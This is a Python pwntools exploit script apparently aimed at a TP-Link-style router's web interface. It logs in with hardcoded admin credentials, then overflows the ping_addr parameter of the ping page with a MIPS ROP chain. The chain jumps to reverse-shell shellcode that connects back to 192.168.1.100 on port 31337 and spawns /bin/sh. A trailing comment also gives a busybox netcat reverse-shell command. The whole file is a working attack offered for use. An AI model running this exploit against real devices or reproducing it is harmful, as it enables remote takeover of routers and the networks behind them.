
import re
import struct
import requests
import urllib
from pwn import *
context.arch = 'mips'
context.endian = 'big'
context.bits = 32

def pack(addr):
    return struct.pack(">I", addr)
####### EXPLOIT CODE #######
def login():
    url = "http://192.168.1.1/userRpm/LoginRpm.htm"
    params = {"Save": "Save"}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": "http://192.168.1.1/"
    }
    cookies = {"Authorization": "Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D"}

    response = requests.get(url, params=params, headers=headers, cookies=cookies)
    token = re.search(r'/([A-Z]+)/userRpm', response.text)
    if token:
        return token.group(1)
reverse_shell = (
    b"\x24\x0f\xff\xfa"      # li      $t7, -6
    b"\x01\xe0\x78\x27"      # nor     $t7, $zero
    b"\x21\xe4\xff\xfd"      # addi    $a0, $t7, -3
    b"\x21\xe5\xff\xfd"      # addi    $a1, $t7, -3
    b"\x28\x06\xff\xff"      # slti    $a2, $zero, -1
    b"\x24\x02\x10\x57"      # li      $v0, 4183 ( sys_socket )
    b"\x01\x01\x01\x0c"      # syscall 0x40404
    b"\xaf\xa2\xff\xff"      # sw      $v0, -1($sp)
    b"\x8f\xa4\xff\xff"      # lw      $a0, -1($sp)
    b"\x34\x0f\xff\xfd"      # li      $t7, -3 ( sa_family = AF_INET )
    b"\x01\xe0\x78\x27"      # nor     $t7, $zero
    b"\xaf\xaf\xff\xe0"      # sw      $t7, -0x20($sp)
    
    # ================ Port: 0x7a69 = 31337 ================
    b"\x3c\x0e\x7a\x69"      # lui     $t6, 0x7a69
    b"\x35\xce\x7a\x69"      # ori     $t6, $t6, 0x7a69
    b"\xaf\xae\xff\xe4"      # sw      $t6, -0x1c($sp)
    
    # ================ IP: 0xc0a80164 = 192.168.1.100 ================
    b"\x3c\x0e\xc0\xa8"      # lui     $t6, 0xc0a8
    b"\x35\xce\x01\x64"      # ori     $t6, $t6, 0x0164
    b"\xaf\xae\xff\xe6"      # sw      $t6, -0x1a($sp)
    
    b"\x27\xa5\xff\xe2"      # addiu   $a1, $sp, -0x1e
    b"\x24\x0c\xff\xef"      # li      $t4, -17  ( addrlen = 16 )
    b"\x01\x80\x30\x27"      # nor     $a2, $t4, $zero
    b"\x24\x02\x10\x4a"      # li      $v0, 4170 ( sys_connect )
    b"\x01\x01\x01\x0c"      # syscall 0x40404
    b"\x24\x0f\xff\xfd"      # li      t7,-3
    b"\x01\xe0\x28\x27"      # nor     a1,t7,zero
    b"\x8f\xa4\xff\xff"      # lw      $a0, -1($sp)
    
    # dup2_loop:
    b"\x24\x02\x0f\xdf"      # li      $v0, 4063 ( sys_dup2 )
    b"\x01\x01\x01\x0c"      # syscall 0x40404
    b"\x24\xa5\xff\xff"      # addi    a1,a1,-1
    b"\x24\x01\xff\xff"      # li      at,-1
    b"\x14\xa1\xff\xfb"      # bne     a1,at, dup2_loop
    b"\x28\x06\xff\xff"      # slti    $a2, $zero, -1
    b"\x3c\x0f\x2f\x2f"      # lui     $t7, 0x2f2f
    b"\x35\xef\x62\x69"      # ori     $t7, $t7, 0x6269
    b"\xaf\xaf\xff\xec"      # sw      $t7, -0x14($sp)
    b"\x3c\x0e\x6e\x2f"      # lui     $t6, 0x6e2f
    b"\x35\xce\x73\x68"      # ori     $t6, $t6, 0x7368
    b"\xaf\xae\xff\xf0"      # sw      $t6, -0x10($sp)
    b"\xaf\xa0\xff\xf4"      # sw      $zero, -0xc($sp)
    b"\x27\xa4\xff\xec"      # addiu   $a0, $sp, -0x14
    b"\xaf\xa4\xff\xf8"      # sw      $a0, -8($sp)
    b"\xaf\xa0\xff\xfc"      # sw      $zero, -4($sp)
    b"\x27\xa5\xff\xf8"      # addiu   $a1, $sp, -8
    b"\x24\x02\x0f\xab"      # li      $v0, 4011 (sys_execve)
    b"\x01\x01\x01\x0c"      # syscall 0x40404
)

phase1 = ( 
    asm("addiu $t9, $t9, 0x1156") +  
    asm("addiu $t9, $t9, -0x10aa") +   # tăng $t9 lên 0xac
    asm("xor $s2, $s2, $s2") +      
    asm("xor $s2, $t9") +           # lưu địa chỉ shellcode ở $t9 vao $s2
    asm("jalr $s2")
)
# print(''.join(f'\\x{b:02x}' for b in phase1))
# \x27\x39\x11\x56\x27\x39\xef\x56\x02\x52\x90\x26\x02\x59\x90\x26\x02\x40\xf8\x09
def exploit(token):
    # payload = b'A'*400
    libc_base = 0x2aae2000
    print("[+] LIBC BASE: " + hex(libc_base))
    mov_t9_a0 = pack(libc_base + 0x00041ab0) # move $t9, $a0 ; sw $v0, 0x18($sp) ; jalr $t9 ; addiu $a0, $sp, 0x18
    payload = phase1.ljust(0xa8, b'\x90') + mov_t9_a0
    payload += reverse_shell
    payload = urllib.parse.quote_from_bytes(payload)
    
    auth = "Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D"
    burp0_url = f"http://192.168.1.1:80//{token}/userRpm/PingIframeRpm.htm?ping_addr={payload}&doType=ping&isNew=new&sendNum=4&pSize=64&overTime=800&trHops=20"
    burp0_cookies = {"Authorization": f"{auth}"}
    burp0_headers = {"Connection": "keep-alive", "Authorization": "Basic YWRtaW46YWRtaW4=", 
                    "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36", 
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 
                    "Referer": f"http://192.168.1.1/{token}/userRpm/WlanNetworkRpm.htm", "Accept-Encoding": "gzip, deflate", "Accept-Language": "vi,en;q=0.9"}

    try:
        res = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, verify=False, timeout=2)
        log.success("Exploit payload sent successfully!")
    except (requests.exceptions.Timeout, requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError) as e:
        log.success("Exploit sent! The target may have crashed or is connecting back.")
    except Exception as e:
        log.warning(f"Exploit may have succeeded despite error: {e}")

if __name__ == "__main__":
    print("[*] Exploit started")
    print("[*] Get authentication token")
    token = login()
    print(f"[*] Authentication token: {token}")
    print("[*] Sending exploit payload")
    exploit(token)
    # ./busybox nc 192.168.0.100 4444 -e /bin/sh
